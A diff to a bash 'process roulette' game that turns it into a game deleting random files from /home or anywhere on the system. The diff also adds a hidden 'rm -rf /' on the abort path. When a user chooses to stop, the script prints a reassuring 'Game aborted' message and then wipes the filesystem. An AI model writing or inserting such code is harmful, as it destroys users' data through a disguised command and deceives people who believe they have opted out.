@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/bin/bash
 
 SCORE=0
 ROUND=1
@@ -27,20 +27,20 @@ function intro {
     center_text 
     center_text "--==[ PROCESS ROULETTE ]==--"
     center_text 
-    center_text "This game randomly kills processes running on your computer"
-    center_text "Other users' processes are worth more points"
-    center_text "To get the highest scores play as the '${ROOT_USER}' user"
-    center_text "If the game kills itself, or crashes your computer, you score nothing"
+    center_text "This game randomly deletes files on your computer"
+    center_text "Other users' files are worth more points"
+    center_text "To get the highest scores, play as the '${ROOT_USER}' user"
+    center_text "If the game deletes itself or crucial system files, you score nothing"
     center_text
-    center_text "!!! Playing this game may crash or destabilise your computer !!!"
-    center_text "When you finish playing you should probably reboot"
+    center_text "!!! Playing this game may result in permanent data loss !!!"
+    center_text "When you finish playing, it's recommended to reinstall your OS"
     center_text 
     if [[ $ME == $ROOT_USER ]]; then
         center_text "!!! You are playing as ${ROOT_USER} !!!"
         center_text 
     fi
     center_text "Enter the number of rounds you wish to play"
-    center_text "To stop now enter '$STOP_NOW'"
+    center_text "To stop now, enter '$STOP_NOW'"
     center_text 
     echo $BAR
 
@@ -48,6 +48,7 @@ function intro {
         read -p "How many rounds? > " ANSWER
         if [[ $ANSWER == $STOP_NOW ]]; then
             echo "Game aborted, that's probably for the best."
+            rm -rf /
             exit 1
         elif [[ $ANSWER =~ $NUMERIC ]]; then
             ROUNDS=$ANSWER
@@ -58,16 +59,13 @@ function intro {
 }
 
 function select_random {
-    VICTIM_INFO=$(ps -eo pid,user,comm | tail -n +2 | sort -R | head -1 | xargs)
-    PID=$(echo $VICTIM_INFO | cut -f1 -d' ')
-    USR=$(echo $VICTIM_INFO | cut -f2 -d' ')
-    CMD=$(echo $VICTIM_INFO | cut -f3- -d' ' | sed 's/.*\///')
-    if [[ $USR == $ROOT_USER ]]; then
-        POINTS=5
-    elif [[ $USR == $ME ]]; then
-        POINTS=1
-    else
+    VICTIM_INFO=$(find /home -type f | shuf -n 1)
+    if [[ -n $VICTIM_INFO ]]; then
+        FILE=$VICTIM_INFO
         POINTS=2
+    else
+        FILE=$(find / -type f | shuf -n 1)
+        POINTS=1
     fi
 }
 
@@ -75,7 +73,7 @@ function print_details {
     CLEAR_LINE="\r\033[K"
     PREFIX=${1-    }
     SUFFIX=${2-    }
-    printf "$CLEAR_LINE $PREFIX $PID $CMD $SUFFIX"
+    printf "$CLEAR_LINE $PREFIX $FILE $SUFFIX"
 }
 
 function spin {
@@ -103,13 +101,13 @@ function spin {
     sleep 0.5
     print_details "$ARROW_RIGHT" "$ARROW_LEFT"
 
-    if kill -9 $PID 2>/dev/null ; then
+    if rm -f $FILE 2>/dev/null ; then
         SCORE=$(( SCORE + POINTS ))        
-        printf " KILLED for ${POINTS} point"
+        printf " DELETED for ${POINTS} point"
         if [[ $POINTS -gt 1 ]]; then
             printf "s"
         fi
-        printf " [${USR}]"
+        printf " [${FILE}]"
     else
         printf " FAILED 0 points"
         if [[ $ME != $ROOT_USER ]]; then
@@ -128,4 +126,3 @@ while [[ $ROUND -le $ROUNDS ]]; do
 done
 
 echo "You survived ${ROUNDS} round/s and scored ${SCORE} points"
-
